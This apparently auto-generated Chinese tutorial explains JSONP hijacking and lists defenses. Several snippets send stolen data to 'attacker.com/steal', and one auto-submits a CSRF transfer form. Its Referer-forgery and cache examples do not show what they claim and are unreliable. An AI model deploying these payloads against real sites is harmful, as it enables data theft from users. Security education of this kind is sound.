### JSONP劫持漏洞简介

JSONP（JSON with Padding）是一种用于跨域数据请求的技术，通常用于解决浏览器的同源策略限制。JSONP的工作原理是通过动态创建`<script>`标签，将跨域请求的数据作为JavaScript代码返回，并在客户端通过回调函数处理数据。然而，JSONP的这种特性也带来了安全风险，尤其是在未正确验证请求来源的情况下，可能导致JSONP劫持漏洞。

### JSONP劫持漏洞的原理

JSONP劫持漏洞的核心在于攻击者能够利用JSONP接口返回的数据，窃取用户的敏感信息。具体来说，当JSONP接口未对请求来源进行严格验证时，攻击者可以构造恶意页面，诱导用户访问该页面，从而窃取用户的JSONP数据。

### 常见的JSONP劫持攻击手法

1. **未验证请求来源**  
   JSONP接口通常通过`callback`参数指定回调函数名。如果服务器未对请求来源进行验证，攻击者可以构造恶意页面，指定自己的回调函数，从而窃取返回的数据。

   ```html
   <script>
       function maliciousCallback(data) {
           // 窃取数据并发送到攻击者服务器
           fetch('https://attacker.com/steal', {
               method: 'POST',
               body: JSON.stringify(data)
           });
       }
   </script>
   <script src="https://victim.com/api?callback=maliciousCallback"></script>
   ```

2. **利用Referer头**  
   有些JSONP接口可能会检查`Referer`头，确保请求来自合法的域名。然而，攻击者可以通过伪造`Referer`头绕过这种检查。

   ```html
   <iframe src="https://attacker.com/fake-referer"></iframe>
   <script>
       function maliciousCallback(data) {
           fetch('https://attacker.com/steal', {
               method: 'POST',
               body: JSON.stringify(data)
           });
       }
   </script>
   <script src="https://victim.com/api?callback=maliciousCallback"></script>
   ```

3. **利用CSRF漏洞**  
   JSONP劫持漏洞通常与CSRF（跨站请求伪造）漏洞结合使用。攻击者可以构造恶意表单或AJAX请求，诱导用户执行敏感操作。

   ```html
   <form action="https://victim.com/transfer" method="POST">
       <input type="hidden" name="amount" value="1000">
       <input type="hidden" name="to" value="attacker">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```

4. **利用浏览器缓存**  
   如果JSONP接口的响应被浏览器缓存，攻击者可以通过构造恶意页面，诱导用户访问缓存的数据，从而窃取敏感信息。

   ```html
   <script>
       function maliciousCallback(data) {
           fetch('https://attacker.com/steal', {
               method: 'POST',
               body: JSON.stringify(data)
           });
       }
   </script>
   <script src="https://victim.com/api?callback=maliciousCallback"></script>
   ```

### JSONP劫持漏洞的利用方式

1. **窃取用户数据**  
   攻击者可以通过JSONP劫持漏洞窃取用户的敏感信息，如个人信息、账户余额、交易记录等。

2. **执行敏感操作**  
   攻击者可以利用JSONP劫持漏洞执行敏感操作，如转账、修改账户信息、删除数据等。

3. **扩大攻击范围**  
   JSONP劫持漏洞可以与其他漏洞结合使用，扩大攻击范围。例如，结合XSS（跨站脚本）漏洞，攻击者可以在受害者的浏览器中执行恶意脚本。

### 防御措施

1. **验证请求来源**  
   服务器应验证JSONP请求的来源，确保请求来自合法的域名。可以通过检查`Referer`头或使用CSRF令牌来实现。

2. **限制回调函数名**  
   服务器应限制回调函数名的范围，避免攻击者指定恶意回调函数。可以使用白名单机制，只允许预定义的回调函数名。

3. **使用CORS替代JSONP**  
   尽可能使用CORS（跨域资源共享）替代JSONP，CORS提供了更安全的跨域数据请求机制。

4. **禁用缓存**  
   对于敏感的JSONP接口，应禁用浏览器缓存，避免攻击者通过缓存窃取数据。

5. **使用HTTPS**  
   使用HTTPS加密通信，防止攻击者窃听或篡改数据。

### 总结

JSONP劫持漏洞是一种常见的Web安全漏洞，攻击者可以利用该漏洞窃取用户的敏感信息或执行敏感操作。为了防御JSONP劫持漏洞，开发人员应验证请求来源、限制回调函数名、使用CORS替代JSONP、禁用缓存并使用HTTPS加密通信。通过这些措施，可以有效降低JSONP劫持漏洞的风险，保护用户的数据安全。

---

*文档生成时间: 2025-03-11 14:19:52*






















